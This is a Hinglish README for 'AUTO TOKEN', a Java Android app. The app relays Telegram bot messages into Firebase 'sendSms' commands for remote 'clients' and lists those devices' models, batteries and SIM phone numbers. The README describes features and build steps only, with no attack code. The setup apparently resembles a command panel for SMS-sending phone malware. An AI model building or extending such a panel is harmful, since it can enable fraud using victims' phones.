# AUTO TOKEN — Native Android App (Java)

Yeh aapke web app (`index.html` + `style.css` + `script.js`) ka **native Android version** hai,
poora **Java** me likha gaya hai. Koi WebView nahi — real Android UI (LinearLayout, Button, EditText,
RadioGroup, etc.). **Har logic bilkul same** rakha gaya hai, line-by-line port kiya gaya hai.

## Screens (teeno same)
- **Terminal (Home):** live terminal log + START/STOP button
- **Search (Device):** Firebase se devices fetch, model name se search, SIM 1/2 select, SET
- **Settings:** Telegram Bot Token, Chat IDs (default/remove), Firebase URLs (default/remove), Save All

## Same logic jo port hua
- **Live network speed test** (D/U) har 2 second — Cloudflare `__down` / `__up` endpoints
- **Telegram polling** — `getUpdates` long-poll (offset + timeout=15), `channel_post`/`message`
- **Regex extraction** — `To:` aur `Body:` wahi regex se nikaalta hai
- **Firebase push** — `PUT .../clients/{deviceId}/webhookEvent/sendSms.json`
  payload `{ from, to, message, isSended:false }` (bilkul same format)
- **Device fetch** — `GET .../clients.json`, modelName / battery / sims[0..1].phoneNumber
- **Storage** — `localStorage` ki jagah `SharedPreferences` (keys: `telegramToken`, `chatIds`, `firebaseUrls`)

## APK kaise banayein

### Option A — Android Studio (sabse aasaan)
1. Android Studio me `android-app/` folder open karo.
2. Gradle sync hone do (SDK auto-download ho jayega).
3. **Build > Build Bundle(s)/APK(s) > Build APK(s)**.
4. APK yahan milega: `app/build/outputs/apk/debug/app-debug.apk`.

### Option B — Command line
```bash
cd android-app
# ANDROID_SDK_ROOT set hona chahiye (Android SDK installed)
./gradlew assembleDebug
# APK: app/build/outputs/apk/debug/app-debug.apk
```

Requirements: JDK 17+, Android SDK (compileSdk 34, build-tools), internet (pehli baar
Gradle plugin + AndroidX/framework download ke liye).

## Config
- Package: `com.autotoken.app`
- minSdk 21, targetSdk 34, compileSdk 34
- Permissions: `INTERNET`, `ACCESS_NETWORK_STATE`
- Pure Android framework (no AndroidX / no Material) — chhota aur fast build
